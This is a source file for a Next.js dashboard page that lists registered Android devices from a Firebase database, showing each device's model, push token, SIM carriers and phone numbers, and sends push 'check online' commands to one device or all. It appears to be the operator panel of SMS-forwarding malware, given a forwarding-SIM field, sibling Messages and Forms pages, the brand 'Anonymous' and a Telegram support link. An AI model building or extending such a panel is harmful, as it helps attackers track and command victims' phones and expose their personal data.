"use client";

import Link from "next/link";
import { usePathname, useRouter } from "next/navigation";
import Device from "@/types/devicetype";
import { getDeviceStatusFromAvailability } from "@/lib/deviceStatus";
import { db } from "@/lib/firbase";
import LineSpinner from "@/components/LineSpinner";
import {
  get,
  limitToFirst,
  onChildAdded,
  onChildChanged,
  onChildRemoved,
  orderByKey,
  query,
  ref,
  startAt,
} from "firebase/database";
import { useCallback, useEffect, useMemo, useRef, useState } from "react";



const INITIAL_PAGE_SIZE = 20;
const NEXT_PAGE_SIZE = 10;
const CHECKONLINE_SYNC_INTERVAL_MS = 5 * 60 * 1000;

type CheckOnlineRecord = Record<string, unknown>;

function normalizeJoinedAt(value: unknown): string {
  if (typeof value === "number" && Number.isFinite(value) && value > 0) {
    return new Date(value).toISOString();
  }

  if (typeof value === "string") {
    const trimmed = value.trim();

    if (trimmed) {
      const numericValue = Number(trimmed);

      if (Number.isFinite(numericValue) && numericValue > 0) {
        return new Date(numericValue).toISOString();
      }

      const parsedDate = Date.parse(trimmed);

      if (!Number.isNaN(parsedDate)) {
        return new Date(parsedDate).toISOString();
      }
    }
  }

  return new Date(0).toISOString();
}

function normalizeCheckedAt(value: unknown): string {
  if (typeof value === "number" && Number.isFinite(value) && value > 0) {
    return new Date(value).toISOString();
  }

  if (typeof value === "string") {
    const trimmed = value.trim();

    if (!trimmed) {
      return "";
    }

    const numericValue = Number(trimmed);

    if (Number.isFinite(numericValue) && numericValue > 0) {
      return new Date(numericValue).toISOString();
    }

    const parsedDate = Date.parse(trimmed);

    if (!Number.isNaN(parsedDate)) {
      return new Date(parsedDate).toISOString();
    }
  }

  return "";
}

function getRegisteredCheckOnline(
  rawData: Record<string, unknown>,
): CheckOnlineRecord | undefined {
  const nestedCheckOnline = rawData.checkOnline;

  return nestedCheckOnline && typeof nestedCheckOnline === "object"
    ? (nestedCheckOnline as CheckOnlineRecord)
    : undefined;
}

function getOnlineStatus(
  checkOnline?: CheckOnlineRecord,
): Device["onlineStatus"] {
  return getDeviceStatusFromAvailability(checkOnline?.available);
}

function mapToDevice(
  deviceId: string,
  rawData: Record<string, unknown>,
): Device {
  const checkOnline = getRegisteredCheckOnline(rawData);

  return {
    deviceId,
    model: typeof rawData.model === "string" ? rawData.model : "Unknown",
    brand: typeof rawData.brand === "string" ? rawData.brand : "Unknown",
    forwardingSim: null,
    androidVersion:
      typeof rawData.androidVersion === "number"
        ? String(rawData.androidVersion)
        : "Unknown",
    joinedAt: normalizeJoinedAt(rawData.joinedAt),
    fcmToken: typeof rawData.fcmToken === "string" ? rawData.fcmToken : "",
    adminPhoneNumber: [],
    manufacturer:
      typeof rawData.manufacturer === "string"
        ? rawData.manufacturer
        : "Unknown",
    sim1Carrier:
      typeof rawData.sim1Carrier === "string" ? rawData.sim1Carrier : "",
    sim1number:
      typeof rawData.sim1Number === "string" ? rawData.sim1Number : "",
    sim2Carrier:
      typeof rawData.sim2Carrier === "string" ? rawData.sim2Carrier : "",
    sim2number:
      typeof rawData.sim2Number === "string" ? rawData.sim2Number : "",
    onlineStatus: getOnlineStatus(checkOnline),
    lastChecked: normalizeCheckedAt(
      checkOnline?.checkedAt ?? checkOnline?.lastChecked,
    ),
    isfavorite: Boolean(rawData.isfavorite),
  };
}

function formatLastChecked(value: string): string {
  if (!value) {
    return "N/A";
  }

  const checkedTime = new Date(value).getTime();

  if (Number.isNaN(checkedTime)) {
    return "N/A";
  }

  const diffMs = Date.now() - checkedTime;

  if (diffMs < 0) {
    return "just now";
  }

  const minutes = Math.floor(diffMs / (1000 * 60));

  if (minutes < 1) {
    return "just now";
  }

  if (minutes < 60) {
    return `${minutes}m ago`;
  }

  const hours = Math.floor(minutes / 60);

  if (hours < 24) {
    return `${hours}h ago`;
  }

  const days = Math.floor(hours / 24);
  return `${days}d ago`;
}

function getPrimarySimLine(device: Device): string {
  const sim1 = [device.sim1Carrier, device.sim1number].filter(Boolean).join(" -- ");
  const sim2 = [device.sim2Carrier, device.sim2number].filter(Boolean).join(" -- ");

  if (sim1) {
    return `SIM 1: ${sim1}`;
  }

  if (sim2) {
    return `SIM 2: ${sim2}`;
  }

  return "SIM: N/A";
}

export default function DevicesPage() {
  const [devices, setDevices] = useState<Device[]>([]);
  const [searchQuery, setSearchQuery] = useState("");
  const [loading, setLoading] = useState(false);
  const [initialLoading, setInitialLoading] = useState(true);
  const [hasMore, setHasMore] = useState(true);
  const [lastKey, setLastKey] = useState<string | null>(null);
  const [activeOnly, setActiveOnly] = useState(false);
  const loaderRef = useRef<HTMLDivElement | null>(null);
  const loadingRef = useRef(false);
  const hasMoreRef = useRef(true);
  const lastKeyRef = useRef<string | null>(null);
  const pathname = usePathname();
  const router = useRouter();
  const [actionLoading, setActionLoading] = useState<string | null>(null);
  const [checkAllLoading, setCheckAllLoading] = useState(false);

  const loadDevices = useCallback(async (batchSize: number) => {
    if (loadingRef.current || !hasMoreRef.current) return;

    loadingRef.current = true;
    setLoading(true);

    try {
      const devicesRef = ref(db, "registeredDevices");

      const cursor = lastKeyRef.current;

      const pagedQuery = cursor
        ? query(
            devicesRef,
            orderByKey(),
            startAt(cursor),
            limitToFirst(batchSize + 1),
          )
        : query(devicesRef, orderByKey(), limitToFirst(batchSize));

      const devicesSnapshot = await get(pagedQuery);

      if (!devicesSnapshot.exists()) {
        hasMoreRef.current = false;
        setHasMore(false);
        return;
      }

      const fetchedDevices: Device[] = [];

      devicesSnapshot.forEach((childSnapshot) => {
        const deviceId = childSnapshot.key;
        const deviceData = childSnapshot.val();

        if (!deviceId || !deviceData) return;

        const device = mapToDevice(deviceId, deviceData);

        fetchedDevices.push(device);
      });

      const nextBatch = cursor
        ? fetchedDevices.filter((d) => d.deviceId !== cursor)
        : fetchedDevices;

      if (nextBatch.length === 0) {
        hasMoreRef.current = false;
        setHasMore(false);
        return;
      }

      setDevices((prev) => {
        const existingIds = new Set(prev.map((d) => d.deviceId));

        const uniqueNew = nextBatch.filter((d) => !existingIds.has(d.deviceId));

        return [...prev, ...uniqueNew];
      });

      const nextLastKey = nextBatch[nextBatch.length - 1]?.deviceId;

      if (nextLastKey) {
        lastKeyRef.current = nextLastKey;
        setLastKey(nextLastKey);
      }

      if (nextBatch.length < batchSize) {
        hasMoreRef.current = false;
        setHasMore(false);
      }
    } catch (error) {
      console.error("Failed to fetch devices", error);
    } finally {
      loadingRef.current = false;
      setLoading(false);
      setInitialLoading(false);
    }
  }, []);

  useEffect(() => {
    void loadDevices(INITIAL_PAGE_SIZE);
  }, [loadDevices]);

  useEffect(() => {
    const observer = new IntersectionObserver(
      (entries) => {
        const [entry] = entries;

        if (
          !entry?.isIntersecting ||
          loadingRef.current ||
          !hasMoreRef.current
        ) {
          return;
        }

        void loadDevices(NEXT_PAGE_SIZE);
      },
      {
        root: null,
        rootMargin: "0px 0px 240px 0px",
        threshold: 0,
      },
    );

    const currentLoader = loaderRef.current;

    if (currentLoader) {
      observer.observe(currentLoader);
    }

    return () => {
      if (currentLoader) {
        observer.unobserve(currentLoader);
      }
      observer.disconnect();
    };
  }, [loadDevices]);

  useEffect(() => {
    const devicesRef = ref(db, "registeredDevices");

    const unsubscribeChanged = onChildChanged(devicesRef, (snapshot) => {
      const childKey = snapshot.key;
      const childValue = snapshot.val();

      if (!childKey || !childValue || typeof childValue !== "object") {
        return;
      }

      const updatedDevice = mapToDevice(
        childKey,
        childValue as Record<string, unknown>,
      );

      setDevices((prevDevices) => {
        const deviceIndex = prevDevices.findIndex(
          (device) => device.deviceId === childKey,
        );

        if (deviceIndex < 0) {
          return prevDevices;
        }

        const nextDevices = [...prevDevices];
        nextDevices[deviceIndex] = updatedDevice;
        return nextDevices;
      });
    });

    const unsubscribeRemoved = onChildRemoved(devicesRef, (snapshot) => {
      const childKey = snapshot.key;

      if (!childKey) {
        return;
      }

      setDevices((prevDevices) =>
        prevDevices.filter((device) => device.deviceId !== childKey),
      );
    });

    return () => {
      unsubscribeChanged();
      unsubscribeRemoved();
    };
  }, []);

  useEffect(() => {
    hasMoreRef.current = hasMore;
  }, [hasMore]);

  useEffect(() => {
    lastKeyRef.current = lastKey;
  }, [lastKey]);

  useEffect(() => {
    if (hasMore || !lastKey) {
      return;
    }

    const devicesRef = ref(db, "registeredDevices");
    const tailQuery = query(devicesRef, orderByKey(), startAt(lastKey));

    const unsubscribeAdded = onChildAdded(tailQuery, (snapshot) => {
      const childKey = snapshot.key;
      const childValue = snapshot.val();

      if (
        !childKey ||
        childKey === lastKey ||
        !childValue ||
        typeof childValue !== "object"
      ) {
        return;
      }

      const appendedDevice = mapToDevice(
        childKey,
        childValue as Record<string, unknown>,
      );

      setDevices((prevDevices) => {
        if (prevDevices.some((device) => device.deviceId === childKey)) {
          return prevDevices;
        }

        return [...prevDevices, appendedDevice];
      });

      if (childKey.localeCompare(lastKeyRef.current ?? "") > 0) {
        lastKeyRef.current = childKey;
        setLastKey(childKey);
      }
    });

    return () => unsubscribeAdded();
  }, [hasMore, lastKey]);

  useEffect(() => {
    let isCancelled = false;

    const syncStaleOfflineDevices = async () => {
      try {
        const response = await fetch("/api/checkonline-maintenance", {
          method: "POST",
          cache: "no-store",
        });

        if (!response.ok && !isCancelled) {
          console.error("checkOnline maintenance request failed");
        }
      } catch (error) {
        if (!isCancelled) {
          console.error("Failed to trigger checkOnline maintenance", error);
        }
      }
    };

    void syncStaleOfflineDevices();

    const intervalId = window.setInterval(() => {
      void syncStaleOfflineDevices();
    }, CHECKONLINE_SYNC_INTERVAL_MS);

    return () => {
      isCancelled = true;
      window.clearInterval(intervalId);
    };
  }, []);

  // Check if device is active (last seen within 15 minutes)
  const isDeviceActive = (device: Device): boolean => {
    if (!device.lastChecked) return false;
    const lastCheckedTime = new Date(device.lastChecked).getTime();
    if (isNaN(lastCheckedTime)) return false;
    const now = Date.now();
    const fifteenMinutes = 15 * 60 * 1000;
    return (now - lastCheckedTime) <= fifteenMinutes;
  };

  // Count of active devices (based on full device list)
  const activeCount = useMemo(() => {
    return devices.filter(isDeviceActive).length;
  }, [devices]);

  const normalizedQuery = searchQuery.trim().toLowerCase();
  const filteredDevices = useMemo(() => {
    let result = devices;
    if (normalizedQuery) {
      result = result.filter((device) => {
        const searchableText = [
          device.deviceId,
          device.brand,
          device.model,
          device.androidVersion,
          device.fcmToken,
          device.sim1Carrier,
          device.sim1number,
          device.sim2Carrier,
          device.sim2number,
        ]
          .join(" ")
          .toLowerCase();

        return searchableText.includes(normalizedQuery);
      });
    }
    if (activeOnly) {
      result = result.filter(isDeviceActive);
    }
    return result;
  }, [devices, searchQuery, activeOnly]);

  const sendFCMAction = async (device: Device, endpoint: string, loadingKey?: string) => {
    const key = loadingKey || endpoint;
    setActionLoading(key);
    try {
      const res = await fetch(endpoint, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          deviceId: device.deviceId,
          token: device.fcmToken,
          title: "Check Status",
          body: "Checking device status",
        }),
      });
      const data = await res.json();
      if (data.success) {
        return true;
      } else {
        console.warn(`Check status failed for ${device.deviceId}: ${data.error}`);
        return false;
      }
    } catch {
      console.error(`Network error sending check status to ${device.deviceId}`);
      return false;
    } finally {
      setActionLoading(null);
    }
  };

  const handleCheckAll = async () => {
    if (checkAllLoading) return;
    if (!filteredDevices.length) {
      alert("No devices to check");
      return;
    }

    const confirmMsg = `This will send a status check to ${filteredDevices.length} device(s). Continue?`;
    if (!confirm(confirmMsg)) return;

    setCheckAllLoading(true);
    let successCount = 0;
    let failCount = 0;

    for (let i = 0; i < filteredDevices.length; i++) {
      const device = filteredDevices[i];
      try {
        setActionLoading(`check-${device.deviceId}`);
        const result = await sendFCMAction(device, "/api/checkstatus", `check-${device.deviceId}`);
        if (result) successCount++;
        else failCount++;
      } catch (error) {
        failCount++;
      } finally {
        setActionLoading(null);
      }
      await new Promise(resolve => setTimeout(resolve, 300));
    }

    setCheckAllLoading(false);
    alert(`Check all complete: ${successCount} succeeded, ${failCount} failed.`);
  };

  const handleCardClick = (deviceId: string) => {
    if (!deviceId || deviceId === "Unknown") {
      return;
    }
    
    const url = `/devices/${deviceId}`;
    window.open(url, '_blank');
  };

  return (
    <div className="min-h-screen bg-white">
      <header className="w-full bg-black">
        <div className="mx-auto flex w-full max-w-3xl items-center justify-between px-5 py-4">
          <Link href="/all" className="text-xl font-extrabold italic leading-none text-[#9ad83d]">
            Anonymous
          </Link>
          <nav className="flex flex-wrap items-center gap-4 text-sm font-semibold text-white sm:gap-6 sm:text-base">
            <Link href="/all" className={`transition-colors ${pathname === "/all" ? "text-white" : "text-white/85 hover:text-white"}`}>
              Home
            </Link>
            <Link href="/settings" className={`transition-colors ${pathname === "/settings" ? "text-white" : "text-white/85 hover:text-white"}`}>
              Setting
            </Link>
           <a
  href="https://t.me/Babydon217?text=Hello%20Babydon%2C%20please%20fix%20my%20harmful%20issue%20as%20soon%20as%20possible."
  target="_blank"
  rel="noopener noreferrer"
  className="text-white/85 transition-colors hover:text-white"
>
  Support
</a>
            <button
              onClick={async () => {
                await fetch("/api/logout", { method: "POST" });
                router.push("/login");
              }}
              className="text-white/85 transition-colors hover:text-white cursor-pointer"
            >
              Logout
            </button>
          </nav>
        </div>
      </header>

      {initialLoading ? (
        <LineSpinner />
      ) : (
        <main className="mx-auto w-full max-w-3xl px-5 py-8">
          <div className="space-y-5 rounded-[14px] border border-gray-300 bg-gray-100 p-5">
            {/* First row: dropdown and Check All */}
            <div className="flex items-center gap-3">
              <select
                aria-label="Filter devices"
                className="h-12 flex-1 rounded-2xl border-2 border-gray-400 bg-gray-100 px-4 text-base font-semibold text-gray-800 outline-none"
                onChange={(e) => router.push(e.target.value)}
                value={pathname}
              >
                <option value="/all">All</option>
                <option value="/messages">Messages</option>
                <option value="/forms">Forms</option>
                <option value="/devices">Devices</option>
              </select>
              <button
                type="button"
                onClick={handleCheckAll}
                disabled={checkAllLoading}
                className="h-12 rounded-2xl border-2 border-gray-400 bg-gray-100 px-6 text-base font-semibold text-gray-800 transition hover:bg-gray-200 disabled:opacity-50"
              >
                {checkAllLoading ? "Checking..." : "Check All"}
              </button>
            </div>

            {/* Second row: search input and Active button with count */}
            <div className="flex items-center gap-3">
              <div className="relative flex-1">
                <span className="pointer-events-none absolute left-4 top-1/2 -translate-y-1/2 text-base text-gray-500">
                  ⌕
                </span>
                <input
                  type="text"
                  value={searchQuery}
                  onChange={(event) => setSearchQuery(event.target.value)}
                  placeholder="Search Devices"
                  className="h-12 w-full rounded-2xl border-2 border-gray-400 bg-gray-100 pl-10 pr-4 text-base text-gray-800 outline-none placeholder:text-gray-500"
                />
              </div>
              <button
                type="button"
                onClick={() => setActiveOnly(!activeOnly)}
                className={`h-12 rounded-2xl border-2 px-6 text-base font-semibold transition whitespace-nowrap ${
                  activeOnly
                    ? "border-blue-600 bg-blue-600 text-white"
                    : "border-gray-400 bg-gray-100 text-gray-800 hover:bg-gray-200"
                }`}
              >
                {activeOnly ? "Active ✓" : `Active (${activeCount})`}
              </button>
            </div>
          </div>

          <div className="mt-8 grid grid-cols-2 gap-5">
            {filteredDevices.map((device, index) => {
              const displayIndex = filteredDevices.length - index;

              return (
                <div
                  key={device.deviceId}
                  onClick={() => handleCardClick(device.deviceId)}
                  style={{ cursor: 'pointer' }}
                  className="flex flex-col border border-gray-300 bg-white rounded-lg p-4"
                >
                  <h2 className="mb-3 text-center text-sm font-bold leading-tight text-blue-700">
                    {displayIndex}. {device.brand} {device.model} ({device.androidVersion})
                  </h2>

                  <div className="flex-1 overflow-hidden border border-gray-300 bg-gray-50 text-center text-xs font-semibold text-gray-700 rounded">
                    <div className="px-3 py-2 break-all border-b border-gray-300">{device.brand} {device.model}</div>
                    <div className="px-3 py-2 break-all border-b border-gray-300">ID: {device.deviceId}</div>
                    <div className="px-3 py-2 border-b border-gray-300">Android: {device.androidVersion}</div>
                    <div className="px-3 py-2 border-b border-gray-300">{getPrimarySimLine(device)}</div>
                    <div className="px-3 py-2">
                      online: <span className="text-red-500">{formatLastChecked(device.lastChecked)}</span>
                    </div>
                  </div>

                  <div className="mt-3 flex justify-center">
                    <button
                      type="button"
                      onClick={(e) => {
                        e.stopPropagation();
                        sendFCMAction(device, "/api/checkstatus", `check-${device.deviceId}`);
                      }}
                      disabled={actionLoading === `check-${device.deviceId}`}
                      className="rounded-lg border-2 border-blue-700 px-4 py-2 text-xs font-bold text-blue-700 hover:bg-blue-700 hover:text-white transition disabled:opacity-50 cursor-pointer"
                    >
                      {actionLoading === `check-${device.deviceId}` ? "Checking..." : "Check Online"}
                    </button>
                  </div>
                </div>
              );
            })}

            {loading && (
              <div className="flex items-center justify-center gap-3 py-6 text-sm text-gray-500 col-span-2">
                <div className="h-5 w-5 animate-spin rounded-full border-2 border-gray-300 border-t-yellow-500" />
                <span>Loading more devices...</span>
              </div>
            )}

            {!hasMore && filteredDevices.length > 0 && (
              <p className="py-6 text-center text-sm text-gray-500 col-span-2">No more devices to load.</p>
            )}

            {!loading && filteredDevices.length === 0 && devices.length > 0 && (
              <p className="py-6 text-center text-sm text-gray-500 col-span-2">No devices match your search.</p>
            )}

            <div ref={loaderRef} className="h-1 w-full col-span-2" />
          </div>
        </main>
      )}
    </div>
  );
}